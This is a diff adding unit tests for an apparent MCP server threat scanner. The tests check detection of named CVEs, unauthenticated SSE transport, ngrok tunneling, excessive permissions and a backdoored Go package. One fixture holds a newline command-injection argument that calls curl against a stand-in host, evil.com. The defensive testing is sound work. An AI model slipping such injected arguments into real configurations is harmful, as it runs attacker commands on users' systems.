@@ -359,6 +359,138 @@ describe('analyzeKnownThreats', () => {
     expect(findings.length).toBeGreaterThan(0)
     expect(findings.some((f) => f.description.includes('CVE-2025-68143') || f.description.includes('git_init'))).toBe(true)
   })
+
+  it('detects Filesystem MCP Server sandbox escape (CVE-2025-53109)', () => {
+    const server: MCPServer = {
+      name: 'fs-server',
+      command: 'npx',
+      args: ['-y', '@modelcontextprotocol/server-filesystem@0.5.0'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('CVE-2025-53109') || f.description.includes('sandbox escape'))).toBe(true)
+  })
+
+  it('detects MCP Ruby SDK session hijacking (CVE-2026-33946)', () => {
+    const server: MCPServer = {
+      name: 'mcp-ruby',
+      command: 'ruby',
+      args: ['server.rb'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('CVE-2026-33946') || f.description.includes('session hijacking'))).toBe(true)
+  })
+
+  it('detects MCP Inspector vulnerability (CVE-2025-49596)', () => {
+    const server: MCPServer = {
+      name: 'inspector',
+      command: 'npx',
+      args: ['-y', '@modelcontextprotocol/inspector'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('CVE-2025-49596') || f.description.includes('Inspector'))).toBe(true)
+  })
+
+  it('detects Playwright MCP browser automation abuse', () => {
+    const server: MCPServer = {
+      name: 'playwright-mcp',
+      command: 'npx',
+      args: ['-y', 'playwright-mcp'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('browser') || f.description.includes('Browser'))).toBe(true)
+  })
+
+  it('detects MCP server with secret manager access', () => {
+    const server: MCPServer = {
+      name: 'vault-mcp',
+      command: 'node',
+      args: ['server.js'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('secret management') || f.description.includes('Vault'))).toBe(true)
+  })
+
+  it('detects MCP server with Kubernetes access', () => {
+    const server: MCPServer = {
+      name: 'k8s-mcp',
+      command: 'node',
+      args: ['server.js'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('Kubernetes') || f.description.includes('cluster'))).toBe(true)
+  })
+
+  it('detects MCP server tunneling via ngrok', () => {
+    const server: MCPServer = {
+      name: 'my-server',
+      command: 'node',
+      args: ['server.js', '--tunnel', 'ngrok'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('tunnel') || f.description.includes('ngrok'))).toBe(true)
+  })
+
+  it('detects MCP SSE transport without authentication', () => {
+    const server: MCPServer = {
+      name: 'remote-sse',
+      command: 'node',
+      args: ['server.js', '--transport=sse', '--no-auth'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('SSE') || f.description.includes('authentication'))).toBe(true)
+  })
+
+  it('detects newline command injection in args', () => {
+    const server: MCPServer = {
+      name: 'legit',
+      command: 'node',
+      args: ['server.js', '%0a curl http://evil.com'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('newline') || f.description.includes('command injection') || f.description.includes('Command Injection'))).toBe(true)
+  })
+
+  it('detects MCP server requesting excessive permissions', () => {
+    const server: MCPServer = {
+      name: 'overpowered',
+      command: 'node',
+      args: ['server.js', '--allow-all', '--no-sandbox'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('permission') || f.description.includes('security restrictions'))).toBe(true)
+  })
+
+  it('detects malicious Go MCP package', () => {
+    const server: MCPServer = {
+      name: 'go-tools',
+      command: 'go',
+      args: ['run', 'mcp-backdoor'],
+      tools: [],
+    }
+    const findings = analyzeKnownThreats(server)
+    expect(findings.length).toBeGreaterThan(0)
+    expect(findings.some((f) => f.description.includes('Go') || f.description.includes('backdoor'))).toBe(true)
+  })
 })
 
 describe('getKnownThreatCount', () => {
@@ -366,8 +498,8 @@ describe('getKnownThreatCount', () => {
     expect(getKnownThreatCount()).toBeGreaterThan(0)
   })
 
-  it('returns at least 50 threats (current database size)', () => {
-    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(50)
+  it('returns at least 70 threats (current database size)', () => {
+    expect(getKnownThreatCount()).toBeGreaterThanOrEqual(70)
   })
 
   it('returns a consistent count', () => {
